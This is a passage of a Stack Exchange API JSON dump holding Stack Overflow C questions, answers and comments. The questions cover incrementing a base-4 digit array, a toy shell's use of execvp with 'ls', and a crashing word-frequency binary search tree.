7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1497047801, "post_id": 40029446, "comment_id": 75931783, "body": "@WeatherVane ...yes?"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1497094677, "post_id": 40029446, "comment_id": 75941239, "body": "@WeatherVane: it seems possible to accept one&#39;s own answer, but one cannot vote it up, and unlike other accepted answers, it does not appear first if another answer has a better score ;-)"}], "tags": [], "owner": {"reputation": 7022, "user_id": 7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "is_accepted": true, "score": 0, "last_activity_date": 1476387207, "creation_date": 1476387207, "answer_id": 40029446, "question_id": 40008966, "link": "https://stackoverflow.com/questions/40008966/increment-array-to-a-certain-number/40029446#40029446", "title": "Increment array to a certain number", "body": "<p>All right, I found the answer with help from @chqrlie:</p>\n\n<pre><code>int *ito4(int value, int dest[])\n{\n    int i = 4;\n    while (i-- &gt; 0) {\n        dest[i] = value % 4;\n        value /= 4;\n    }\n    return dest;\n}\n\nint main(void)\n{\n    int i, arr[4];\n    for (i = 0; i &lt; 256; i++)\n        print_array(ito4(i, buf), 4);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 7022, "user_id": 7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 157, "favorite_count": 0, "accepted_answer_id": 40029446, "answer_count": 3, "score": 0, "last_activity_date": 1497093819, "creation_date": 1476309051, "last_edit_date": 1476309638, "question_id": 40008966, "link": "https://stackoverflow.com/questions/40008966/increment-array-to-a-certain-number", "title": "Increment array to a certain number", "body": "<p>I have an integer array (representing a 4-digit number) that I need to increment so that each integer never goes higher than 3. Basically, it needs to print every 4-digit number that does not have 4 or higher in it. Here's the output I'm expecting compared to the actual output:</p>\n\n<pre><code>Expected: 0000 0001 0002 0003 0010 0011 0012 0013 0020 0021 0022 .... 3333\nReceived: 0000 1000 2000 3000 3100 3200 3300 3310 3320 3330 3331 3332\n</code></pre>\n\n<p>I know my algorithm's messed up but I don't know what to do to it:</p>\n\n<pre><code>int i, c[4];\n\nmemset(c, 0, sizeof(c));\ni = 0;\nwhile (1) {\n    testprint(c);\n    c[i]++;\n    if (c[i] == 3)\n        i++;\n    if (i == 3)\n        break;\n}\n</code></pre>\n\n<p>All <code>testprint</code> does is display every digit in the array. So how should I change my code to correctly increment the array? And do I even need to use an array? How would I do this without one?</p>\n"}, {"tags": ["c", "linux", "shell"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476309811, "post_id": 40008932, "comment_id": 67296356, "body": "Doesn&#39;t this output give you a clue: <code>Vlue of arg[1] =</code>? You are providing an empty string to <code>ls</code> as a parameter. That is, you are runnning <code>ls &#39;&#39;</code>. Run that command manually and you will see the same result. You should not be hard coding two arguments."}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476310188, "post_id": 40008932, "comment_id": 67296497, "body": "what if i want to execute two words arguments. I also want to execute some .c file . so that&#39;s why there are two arguments."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476310384, "post_id": 40008932, "comment_id": 67296576, "body": "But that&#39;s not what you are testing. <code>ubos&gt;ls</code>. That has no args to the <code>ls</code> command.  So your shell needs to handle zero arguments (one word). And you can&#39;t do it just by blindly setting the second arg to an empty string (<code>args[1]=arg2;</code>)."}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476310579, "post_id": 40008932, "comment_id": 67296637, "body": "can you give me some code what can i do over here to pass two arguments or one argument."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476310816, "post_id": 40008932, "comment_id": 67296728, "body": "I&#39;ve pointed out the problem. Now how about you give it a go yourself first instead of just asking for the code?"}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476311083, "post_id": 40008932, "comment_id": 67296828, "body": "i have written one test1.c code. if i type ./test1 it runs succesfully"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476311149, "post_id": 40008932, "comment_id": 67296859, "body": "Well that&#39;s probably because <code>test1</code> doesn&#39;t care about any of the args (or it can handle empty strings) so it doesn&#39;t matter if the args are wrong. But it does matter to <code>ls</code> what the exact parameter value is."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1476311759, "post_id": 40008932, "comment_id": 67297082, "body": "FYI, you don&#39;t need to put the <code>\\0</code> explicitly in the string. Just write <code>char arg1[MAX_LINE&#47;2] = &quot;&quot;;</code> to initialize it to an empty string."}], "answers": [{"comments": [{"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476311623, "post_id": 40009351, "comment_id": 67297038, "body": "it showing me the segmentation falult when i enter ls as argument"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476311861, "post_id": 40009351, "comment_id": 67297109, "body": "The loop that prints the value of each argument needs to stop when it gets to the end."}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476312733, "post_id": 40009351, "comment_id": 67297348, "body": "thank you.  if (strlen(arg2) == &#39;\\0&#39;) \t{    \t\t args[0] = arg1; \t\t args[1] = &#39;\\0&#39;; \t}  \telse  \t{ \t\targs[0] = arg1;     \t\targs[1] = arg2;     \t\targs[2] = 0; \t}"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476312804, "post_id": 40009351, "comment_id": 67297371, "body": "Why do you use <code>&#39;\\0&#39;</code> instead of <code>0</code> when it&#39;s a number or pointer, not a character?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476313042, "post_id": 40009351, "comment_id": 67297427, "body": "<code>&#39;\\0&#39;</code> is a null character. It&#39;s not usually used when you want an integer or pointer."}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476313067, "post_id": 40009351, "comment_id": 67297436, "body": "argument is the number so it should be null or it should have some character. If i write  args[1] = 0  it will save 0 as the value of args[1]."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476313165, "post_id": 40009351, "comment_id": 67297460, "body": "That&#39;s what you want, since <code>0</code> indicates the end of the arguments."}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476313413, "post_id": 40009351, "comment_id": 67297538, "body": "Thank you for your help. Can you please tell me will goto statement will work over here??"}, {"owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476313570, "post_id": 40009351, "comment_id": 67297581, "body": "I was using goto statement after executing the arguments. but it was not working."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "edited": false, "score": 0, "creation_date": 1476313983, "post_id": 40009351, "comment_id": 67297676, "body": "<code>execvp</code> replaces the current program with the program you&#39;re executing. Unless it gets an error, nothing after that executes. If you want your program to continue, you need to fork a child process to execute the program. The parent process should use <code>wait()</code> to wait for the child to finish, then the <code>goto</code> will work."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 0, "last_activity_date": 1476312834, "last_edit_date": 1476312834, "creation_date": 1476310973, "answer_id": 40009351, "question_id": 40008932, "link": "https://stackoverflow.com/questions/40008932/ls-command-does-not-work-in-the-program-written-in-cshell-script/40009351#40009351", "title": "ls command does not work in the Program written in C(shell script)", "body": "<p>If they don't provide an argument, set that argument in <code>args</code> to <code>0</code>. Then <code>ls</code> won't receive an empty string as its first argument, it won't get any arguments at all.</p>\n\n<pre><code>args[0] = arg1;\nif (strlen(arg2) == 0) {\n    args[1] = 0;\n} else {\n    args[1] = arg2;\n    args[2] = 0;\n}\n</code></pre>\n\n<p>You also need to check for this in the loop that prints all the arguments.</p>\n\n<pre><code>for(i=0;i&lt;MAX &amp;&amp; arg[i];i++)\n{\n    printf(\"Value of arg[%d] =%s\\n\",i, args[i]);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "is_accepted": false, "score": -1, "last_activity_date": 1476312892, "creation_date": 1476312892, "answer_id": 40009662, "question_id": 40008932, "link": "https://stackoverflow.com/questions/40008932/ls-command-does-not-work-in-the-program-written-in-cshell-script/40009662#40009662", "title": "ls command does not work in the Program written in C(shell script)", "body": "<pre><code>if (strlen(arg2) == '\\0')\n    {\n         args[0] = arg1;\n         args[1] = '\\0';\n    } \n    else \n    {\n        args[0] = arg1;\n            args[1] = arg2;\n            args[2] = 0;\n    }\nfor(i=0;i&lt;MAX &amp;&amp; args[i];i++)\n    {\n            printf(\"Vlue of args[%d] =%s\\n\",i, args[i]);\n    }\n</code></pre>\n\n<p>I was passing the blank space as the second argument. so it was showing me the error. Above code is the solution of my problem..</p>\n"}], "owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 183, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1476335251, "creation_date": 1476308903, "last_edit_date": 1476335251, "question_id": 40008932, "link": "https://stackoverflow.com/questions/40008932/ls-command-does-not-work-in-the-program-written-in-cshell-script", "title": "ls command does not work in the Program written in C(shell script)", "body": "<pre><code>void main() {\n    char *args[MAX_LINE];\n    char arg1[MAX_LINE/2] = \"\\0\";\n    char arg2[MAX_LINE/2] = \"\\0\";\n    printf(\"ubos&gt;\");\n    fflush(stdout);\n    fgets(arg1, sizeof(arg1), stdin);\n    arg1[strlen(arg1) - 1] = '\\0';\n    fgets(arg2, sizeof(arg2), stdin);\n    arg2[strlen(arg2) - 1] = '\\0';\n\n  abc:  \n    printf(\"You typed: %s %s\\n\", arg1, arg2);\n    fflush(stdin);\n    args[0] = arg1;\n    args[1] = arg2;\n    args[2] = '\\0'; \n\n    int i = 0;\n    for (i = 0; i &lt; MAX; i++) {\n        printf(\"Vlue of arg[%d] =%s\\n\", i, args[i]);\n    }\n\n    if (strcmp(args[0], \"ls\") == 0) {\n        execvp(args[0], args);\n        goto abc;\n    } else\n    if (strcmp(args[0], \"ps\") == 0) {\n\n    }\n\n    printf(\"Something is not correct...\\n\");\n    exit(0);\n}\n</code></pre>\n\n<p>when I run this code with <code>ls</code> command this is the result. I don't know what is the problem with this code. When I run this code to execute another <code>.c</code> file it execute perfectly but when I try to use <code>ls</code> or <code>ps</code> command it does not let me use it and throws the error. </p>\n\n<p>I have one more question why this <code>goto</code> does not working in this program .</p>\n\n<pre><code>ubos&gt;ls\n\nYou typed: ls \nVlue of arg[0] =ls\nVlue of arg[1] =\nVlue of arg[2] =(null)\nls: cannot access : No such file or directory\n</code></pre>\n\n<p>so here is my mistake and can you give me some advise on how to use <strong>exec</strong> command and its different types. </p>\n"}, {"tags": ["c", "linux", "gcc", "memory-leaks", "gcc-warning"], "comments": [{"owner": {"reputation": 124806, "user_id": 121747, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/9fcebb68b105446c0d9eebbce1146044?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/121747/jack"}, "edited": false, "score": 0, "creation_date": 1476308670, "post_id": 40008863, "comment_id": 67295892, "body": "If the same code exposes two different behaviors I suspect nasal demons."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1476309605, "post_id": 40008863, "comment_id": 67296284, "body": "Are you seriously programming on your system as <code>root</code>?"}, {"owner": {"reputation": 89, "user_id": 5394924, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/l8lnd.jpg?s=128&g=1", "display_name": "Wesley", "link": "https://stackoverflow.com/users/5394924/wesley"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476309888, "post_id": 40008863, "comment_id": 67296382, "body": "@chqrlie no I just changed that for confidential purposes"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476310026, "post_id": 40008863, "comment_id": 67296441, "body": "If you want to remove the user name, use <code>ShaolinGOD</code> or some plain username (<code>guest</code>, <code>user</code>...) but do not let newbies believe it is OK to log and work as root."}, {"owner": {"reputation": 89, "user_id": 5394924, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/l8lnd.jpg?s=128&g=1", "display_name": "Wesley", "link": "https://stackoverflow.com/users/5394924/wesley"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476310104, "post_id": 40008863, "comment_id": 67296471, "body": "@chqrlie My bad, will remember that for next time!"}, {"owner": {"reputation": 5298, "user_id": 4241278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53f687af42c3e779a0f2ee98d5fe3bb4?s=128&d=identicon&r=PG", "display_name": "deamentiaemundi", "link": "https://stackoverflow.com/users/4241278/deamentiaemundi"}, "edited": false, "score": 0, "creation_date": 1476310330, "post_id": 40008863, "comment_id": 67296558, "body": "Your yode has some quirks, some were described by chqrlie but not one that could be serious enough. So I think it might be a matter of the way the input is read. Please try to exchange <code>getline(&amp;buf,&amp;len,pFile)</code> with <code>getline(&amp;buf,&amp;len,stdin)</code> an dgive it a try. Highly unlikely that it is the problem but it is cheap and hence worth a try."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 89, "user_id": 5394924, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/l8lnd.jpg?s=128&g=1", "display_name": "Wesley", "link": "https://stackoverflow.com/users/5394924/wesley"}, "edited": false, "score": 0, "creation_date": 1476472700, "post_id": 40009156, "comment_id": 67377156, "body": "@ShaolinGOD: after you store <code>malloc()</code> return value into a pointer, test if this pointer is <code>NULL</code> and exit the function gracefully or abort with an error message as this indicates an out of memory condition."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 0, "last_activity_date": 1476309950, "creation_date": 1476309950, "answer_id": 40009156, "question_id": 40008863, "link": "https://stackoverflow.com/questions/40008863/why-am-i-getting-a-program-failed-memory-fault-core-dumped-in-my-c-program/40009156#40009156", "title": "Why am I getting a &quot;Program failed: Memory fault, core dumped&quot; in my C program?", "body": "<p>You have some issues in your code:</p>\n\n<ul>\n<li><p>You include non-standard file <code>&lt;strings.h&gt;</code>, but not <code>&lt;stdlib.h&gt;</code> where <code>malloc()</code> and <code>free()</code> are declared.</p></li>\n<li><p>You never check <code>malloc()</code> return value. If the test system has very little memory or is configured to make <code>malloc()</code> fail early, which is doable, your program will crash instead of reporting the error.</p></li>\n<li><p>Do not use <code>strncpy((*root)-&gt;word, word, len);</code> to copy the string to allocated memory.  Just use <code>strcpy</code> since you allocated enough memory with <code>strlen(word) + 1</code> bytes, or use <code>strdup()</code>.  <code>strncpy</code> does not do what you think! it has very error prone and widely misunderstood semantics. Never use this function.</p></li>\n<li><p>In the <code>main()</code> function, you should use a <code>TreeNode *root;</code> variable and pass its address to <code>insert_word()</code> instead of allocating a pointer.</p></li>\n</ul>\n\n<p>The only serious issue is the second point above, although it is unlikely to explain the observed behavior.</p>\n"}], "owner": {"reputation": 89, "user_id": 5394924, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/l8lnd.jpg?s=128&g=1", "display_name": "Wesley", "link": "https://stackoverflow.com/users/5394924/wesley"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1204, "favorite_count": 1, "accepted_answer_id": 40009156, "answer_count": 1, "score": 1, "last_activity_date": 1476312550, "creation_date": 1476308595, "last_edit_date": 1476312550, "question_id": 40008863, "link": "https://stackoverflow.com/questions/40008863/why-am-i-getting-a-program-failed-memory-fault-core-dumped-in-my-c-program", "title": "Why am I getting a &quot;Program failed: Memory fault, core dumped&quot; in my C program?", "body": "<p>This program reads text from the standard input and builds a binary search tree containing the individual words from the input. The program reads input until no more data is available, counting the frequency of occurrence of each word in the input. Once the input has been exhausted, the tree will be traversed with an in-order traversal to produce an alphabetical list of words with their frequencies.</p>\n\n<p><strong>Problem:</strong> I can compile my code without any errors and when I run ./wordFreq &lt; input.1, it runs perfect and outputs the correct answer with no errors...this is the correct output:</p>\n\n<pre>\nadditional 1\nagree 3\nanother 3\ndon't 3\nfor 1\nI 1\ninput 4\nis 3\nline 5\nneed 1\none 1\nroad 1\nthe 1\nthink 1\nThis 4\nwe 1\nyet 1\nyou 3\n</pre>\n\n<p>But whenever I submit it to the <strong>try server</strong> it tests the code and tells me that I didn't output anything, and that I had a \"Program failed: Memory fault, core dumped\", this is the output I  am getting on <strong>page 1</strong>:\n<a href=\"https://docs.google.com/document/d/18qr-4yekRH2dZuCo-6oj0o6_VmMyB4svbLtsIo_cFsM/edit?usp=sharing\" rel=\"nofollow\">Try Submission Output</a></p>\n\n<p>This is my <strong>wordFreq.c</strong> file:</p>\n\n<pre><code>#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;strings.h&gt;\n#include \"wordFreq.h\"\n\n#define UNUSED(p)  ((void)(p))\n\n// Creates a node for each unique word it is given, and then inserts this \n// new node in the proper position in the binary search tree, updating \n// whatever pointer is necessary.\n//\n// @param root a pointer to the variable which contains the pointer to the       \n//               root-level node in the tree\n// @param word a pointer to the NUL-terminated arrach of characters\nvoid insert_word(TreeNode** root, const char *word){\n    if (*root == NULL){\n        *root = (TreeNode*)malloc(sizeof(TreeNode));\n        unsigned int len = strlen(word);\n        (*root)-&gt;word = (char *)malloc((len + 1) * sizeof(char));\n        strncpy((*root)-&gt;word, word, len);\n        (*root)-&gt;word[len] = 0;\n        (*root)-&gt;frequency = 1;\n        (*root)-&gt;left = NULL;\n        (*root)-&gt;right = NULL;\n    }\n    else{\n        int compare = strcasecmp(word, (*root)-&gt;word);\n        if (compare &lt; 0){\n            insert_word(&amp;((*root)-&gt;left), word);\n        } else if(compare&gt; 0){\n            insert_word(&amp;((*root)-&gt;right), word);\n        } else if(compare == 0){\n            (*root)-&gt;frequency++;\n        }\n    }\n}\n\n// Traverses the entire tree using an in-order traversal and will \n// print th contents of each node as it is visited\n//\n// @param root a pointer to the root node of the tree\nvoid traverse_tree(const TreeNode* root){\n    if (root == NULL)\n        return;\n    if (root != NULL){\n        traverse_tree(root-&gt;left);\n        printf(\"%s %d\\n\", root-&gt;word, root-&gt;frequency);\n        traverse_tree(root-&gt;right);\n    }\n    return;\n}\n\n// Deallocates all the nodes that were created in insert_node()\n//\n// @param a pointer to the root node of the tree\nvoid cleanup_tree(TreeNode* root){\n    if (root == NULL)\n        return;\n    if (root-&gt;left != NULL){\n        cleanup_tree(root-&gt;left);\n    }\n    if(root-&gt;right != NULL){\n        cleanup_tree(root-&gt;right);\n    }   \n    free(root-&gt;word);\n    free(root);\n    return;\n}\n\nint main(int argc, char* argv[]){\n    UNUSED(argv);\n    if (argc &gt; 1)\n        printf(\"Usage: bst\");\n    else{\n        FILE* pFile = fopen(\"input.1\", \"r\");\n        char *buf = NULL;\n        size_t len = 0;\n        TreeNode** root = NULL;\n        if (!pFile){\n            printf(\"File not found\");\n        } else{\n            root = (TreeNode**)malloc(sizeof(TreeNode*));\n            *root = NULL;\n            while (getline(&amp;buf,&amp;len,pFile) &gt; 0){\n                char * pch;\n                pch = strtok(buf, \" !@#$%^&amp;*?.,:;\\n\");\n                while (pch !=NULL){\n                    insert_word(root, pch);\n                    pch = strtok(NULL, \" !@#$%^&amp;*,:;?.\\n\"); \n                }\n            }\n            free(buf);\n            fclose(pFile);\n            traverse_tree(*root);\n        }\n        cleanup_tree(*root);\n        free(root);\n\n    }\n    return 0;   \n}    \n</code></pre>\n\n<p>This is my <strong>wordFreq.h</strong> file:</p>\n\n<pre><code>#ifndef 